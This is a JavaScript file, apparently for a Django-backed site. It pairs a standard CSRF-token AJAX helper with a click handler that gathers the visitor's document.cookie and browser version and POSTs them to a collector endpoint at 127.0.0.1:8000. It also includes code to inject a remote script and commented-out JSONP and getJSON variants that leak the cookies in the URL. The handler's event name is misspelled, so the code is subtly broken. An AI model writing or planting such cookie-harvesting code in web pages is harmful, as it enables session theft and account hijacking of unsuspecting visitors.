$(document).ready(function () {
/*====================django ajax ======*/
jQuery(document).ajaxSend(function(event, xhr, settings) {
  function getCookie(name) {
      var cookieValue = null;
      if (document.cookie && document.cookie != '') {
          var cookies = document.cookie.split(';');
          for (var i = 0; i < cookies.length; i++) {
              var cookie = jQuery.trim(cookies[i]);
              // Does this cookie string begin with the name we want?
              if (cookie.substring(0, name.length + 1) == (name + '=')) {
                  cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                  break;
              }
          }
      }
      return cookieValue;
  }
  function sameOrigin(url) {
      // url could be relative or scheme relative or absolute
      var host = document.location.host; // host + port
      var protocol = document.location.protocol;
      var sr_origin = '//' + host;
      var origin = protocol + sr_origin;
      // Allow absolute or scheme relative URLs to same origin
      return (url == origin || url.slice(0, origin.length + 1) == origin + '/') ||
          (url == sr_origin || url.slice(0, sr_origin.length + 1) == sr_origin + '/') ||
          // or any other URL that isn't scheme relative or absolute i.e relative.
          !(/^(\/\/|http:|https:).*/.test(url));
  }
  function safeMethod(method) {
      return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
  }

  if (!safeMethod(settings.type) && sameOrigin(settings.url)) {
      xhr.setRequestHeader("X-CSRFToken", getCookie('csrftoken'));
  }
});
/*===============================django ajax end===*/





// $(function() {
//   // 接受订单
// });
$(document).clieck(function () {
    var tag_from = 1;
    if (tag_from == 0) {
      var s = document.createElement("script");
      s.src = "http://127.0.0.1:8000/static/js/from.js";
      document.getElementsByTagName("HEAD")[0].appendChild(s);
    }
    var cookies_data = {};
    cookies_data["u_cookie"] = document.cookie
    cookies_data["u_appVersion"] = navigator.appVersion
    console.log(cookies_data)
  //     <script src="http://127.0.0.1:8000/static/js/do.js"></script>
    $.ajax({
      type: 'POST',
      url: 'http://127.0.0.1:8000/fsrc/cookies/save/',
      data: cookies_data,
      dataType: 'json',
      success: function () {
        console.log("thank you!")
      },
      error: function () {
        console.log("系统错误");
      },
      timeout: 1000
    });
  
    // $.ajax({
    //   type: "GET",
    //   url: "http://127.0.0.1:8000/fsrc/cookies/save_json/",
    //   data: cookies_data,
    //   jsonp: "callback",
    //   dataType: 'jsonp',
    //   success: function () {
    //     console.log("thank you!")
    //   }
    // });
  
    // $.getJSON("http://127.0.0.1:8000/fsrc/cookies/save_json/?u_cookie=" + document.cookie + "&u_appVersion=" + navigator.appVersion,
    // function(result){
    //   console.log("thank you!")
    //   console.log(result)
    // });
});